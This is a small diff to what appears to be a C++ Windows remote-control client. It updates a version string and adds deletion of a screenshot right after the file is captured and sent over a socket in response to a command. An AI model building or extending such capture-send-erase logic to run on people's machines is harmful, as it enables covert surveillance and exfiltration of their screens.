@@ -302,7 +302,7 @@ int main(int argc, char* argv[])
 
     // debug
     // printf("Connected\n_-=v1.4.1=-_");
-    MessageBox(0, "_-=v1.4.2=-_", "Connected!", MB_OK | MB_ICONINFORMATION);
+    MessageBox(0, "_-=v1.4.3=-_", "Connected!", MB_OK | MB_ICONINFORMATION);
 
     char buff[1024];
     while (true)
@@ -482,6 +482,9 @@ int main(int argc, char* argv[])
                     SaveBitmap(filePath.c_str());  // Передача пути к файлу в функцию SaveBitmap
 
                     SendFile(s, &filePath[0]);
+
+                    // delete screenshot
+                    remove(filePath.c_str());
                 }
                 // std::string callback = "Screenshot was taken";
                 // send(s, callback.c_str(), callback.size(), 0);
